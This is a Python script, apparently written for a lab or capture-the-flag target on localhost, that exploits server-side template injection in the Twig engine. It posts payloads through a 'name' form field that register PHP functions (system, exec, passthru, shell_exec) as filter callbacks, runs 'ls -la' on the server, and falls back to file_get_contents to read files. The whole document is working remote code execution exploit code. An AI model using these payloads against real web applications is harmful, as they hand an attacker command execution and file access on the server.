import requests
import urllib.parse
import re

target_url = "http://127.0.0.1:8080/"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

print("="*80)
print("Twig SSTI Exploitation Script - Article Enumeration")
print(f"Target: {target_url}")
print("="*80)

# Payloads to try for command execution
command_payloads = [
    '{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("ls -la")}}',
    '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("ls -la")}}',
    '{{_self.env.registerUndefinedFilterCallback("passthru")}}{{_self.env.getFilter("ls -la")}}',
    '{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{{_self.env.getFilter("ls -la")}}'
]

directory_listing = None

# Try each payload until we get a directory listing
for i, payload in enumerate(command_payloads, 1):
    print(f"\n[*] Attempt {i}/{len(command_payloads)}: Trying command execution payload")
    print(f"[*] Payload: {payload}")
    
    encoded_payload = urllib.parse.quote_plus(payload)
    data = f"name={encoded_payload}"
    
    response = requests.post(target_url, headers=headers, data=data)
    print(f"[*] Response status: {response.status_code}")
    print(f"[*] Raw response:\n{response.text}")
    print("-"*60)
    
    # Check if we got directory listing
    if "total" in response.text or "drwx" in response.text or "-rw" in response.text:
        print(f"[+] SUCCESS! Directory listing obtained with payload {i}")
        directory_listing = response.text
        break
    else:
        print(f"[-] Payload {i} failed to get directory listing")

if not directory_listing:
    print("\n[-] All command execution payloads failed")
    print("[*] Attempting alternative file reading approach...")
    
    # Try to read directory contents using direct file access
    alt_payload = '{{_self.env.registerUndefinedFilterCallback("file_get_contents")}}{{_self.env.getFilter(".")}}'
    print(f"[*] Trying alternative payload: {alt_payload}")
    
    encoded_alt = urllib.parse.quote_plus(alt_payload)
    data = f"name={encoded_alt}"
    
    response = requests.post(target_url, headers=headers, data=data)
    print(f"[*] Response status: {response.status_code}")
    print(f"[*] Raw response:\n{response.text}")
    
    directory_listing = response.text if response.text else None

